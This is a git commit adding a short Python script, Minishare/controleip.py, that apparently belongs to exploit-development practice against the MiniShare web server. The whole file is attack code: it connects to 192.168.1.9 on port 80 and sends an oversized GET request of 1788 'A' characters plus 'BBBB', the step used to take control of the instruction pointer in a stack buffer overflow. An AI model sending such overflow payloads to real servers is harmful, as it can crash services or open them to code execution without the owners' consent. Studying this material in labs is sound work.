e87bc1029dfaeb231290bc4200d1bee963893ca7
killerbee96 <46651030+killerbee96@users.noreply.github.com>
2020-10-07 10:15:12 +0530

    Add files via upload

---
+++ Minishare/controleip.py
@@ -0,0 +1,17 @@
+import socket,sys
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+sock.connect(('192.168.1.9',80))
+
+evil = "GET"
+
+evil += "A"*1788 + "BBBB"
+
+evil += "HTTP/1.1\r\n\r\n"
+
+sock.send(evil)
+
+sock.close()
+
+#sys.argv[1]
